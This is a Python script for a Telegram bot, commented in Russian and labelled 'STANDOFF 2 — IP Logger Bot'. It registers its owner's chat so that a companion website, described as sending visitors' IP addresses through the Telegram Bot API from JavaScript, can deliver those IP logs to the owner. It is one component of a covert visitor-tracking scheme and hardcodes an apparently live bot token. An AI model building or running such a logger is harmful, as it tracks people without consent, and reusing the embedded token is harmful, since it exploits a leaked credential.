#!/usr/bin/env python3
"""
Standoff 2 — Telegram бот для приёма chat_id
Запускается отдельно на VPS / ПК.
Сайт отправляет IP напрямую через Telegram Bot API из JavaScript.

Установка:
    pip install requests

Запуск:
    python bot.py
"""

import requests
import json
import os

# ==========================================
#  НАСТРОЙКИ
# ==========================================
BOT_TOKEN = "7985178174:AAFlxuiC2I04smtAMMIKu4Z8OCMDHMpxnqI"   # Токен от @BotFather
OWNER_USERNAME = "fuckfluger"   # Твой юзернейм в Telegram (без @)
# ==========================================

CHAT_ID_FILE = "chat_id.json"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"


def load_chat_id():
    """Загружает сохранённый chat_id из файла."""
    if os.path.exists(CHAT_ID_FILE):
        with open(CHAT_ID_FILE, "r") as f:
            data = json.load(f)
            return data.get("chat_id")
    return None


def save_chat_id(chat_id):
    """Сохраняет chat_id в файл."""
    with open(CHAT_ID_FILE, "w") as f:
        json.dump({"chat_id": chat_id}, f)
    print(f"[+] Chat ID сохранён: {chat_id}")


def send_message(chat_id, text):
    """Отправляет сообщение в Telegram."""
    requests.post(
        f"{API}/sendMessage",
        json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    )


def get_updates(offset=None):
    """Получает обновления от Telegram (long polling)."""
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        r = requests.get(f"{API}/getUpdates", params=params, timeout=40)
        return r.json().get("result", [])
    except Exception as e:
        print(f"[!] Ошибка getUpdates: {e}")
        return []


def main():
    print("=" * 50)
    print("  STANDOFF 2 — IP Logger Bot")
    print(f"  Владелец: @{OWNER_USERNAME}")
    print("=" * 50)

    # Проверяем что токен валидный
    try:
        me = requests.get(f"{API}/getMe").json()
        if not me.get("ok"):
            print("[!] ОШИБКА: Неверный токен бота!")
            print("    Получи токен у @BotFather и вставь в BOT_TOKEN")
            return
        bot_name = me["result"]["username"]
        print(f"[✓] Бот запущен: @{bot_name}")
    except Exception as e:
        print(f"[!] ОШИБКА подключения: {e}")
        return

    # Проверяем сохранённый chat_id
    saved = load_chat_id()
    if saved:
        print(f"[✓] Сохранённый chat_id: {saved}")
        print(f"[→] IP-логи будут приходить в этот чат")
    else:
        print(f"[→] Напиши /start боту в Telegram (с @{OWNER_USERNAME})")
        print(f"[→] Чтобы начать получать IP-логи")

    print("-" * 50)
    print("Ожидание сообщений... (Ctrl+C для выхода)")
    print()

    last_offset = None

    while True:
        updates = get_updates(last_offset)

        for update in updates:
            last_offset = update["update_id"] + 1

            if "message" not in update:
                continue

            msg = update["message"]
            chat_id = msg["chat"]["id"]
            username = msg["from"].get("username", "")
            first_name = msg["from"].get("first_name", "")
            text = msg.get("text", "")

            # Обработка /start только от владельца
            if text == "/start":
                if username.lower() == OWNER_USERNAME.lower():
                    save_chat_id(chat_id)
                    send_message(chat_id,
                        "✅ <b>Бот активирован!</b>\n\n"
                        f"Chat ID: <code>{chat_id}</code>\n"
                        f"Вставь этот ID в <b>index.html</b> в переменную <code>CHAT_ID</code>\n\n"
                        "Теперь IP-логи с сайта будут приходить сюда."
                    )
                    print(f"[✓] /start от @{username} — chat_id: {chat_id}")
                else:
                    send_message(chat_id,
                        "❌ У вас нет доступа к этому боту."
                    )
                    print(f"[!] /start от @{username} — отказано (не владелец)")

            elif text and username.lower() == OWNER_USERNAME.lower():
                # Любое другое сообщение от владельца — показываем info
                if text == "/id":
                    send_message(chat_id,
                        f"📋 <b>Информация:</b>\n\n"
                        f"Chat ID: <code>{chat_id}</code>\n"
                        f"Бот: @{bot_name}\n"
                        f"Владелец: @{OWNER_USERNAME}"
                    )
                else:
                    send_message(chat_id,
                        "Команды:\n"
                        "/start — активировать бота\n"
                        "/id — показать chat_id"
                    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[✓] Бот остановлен.")
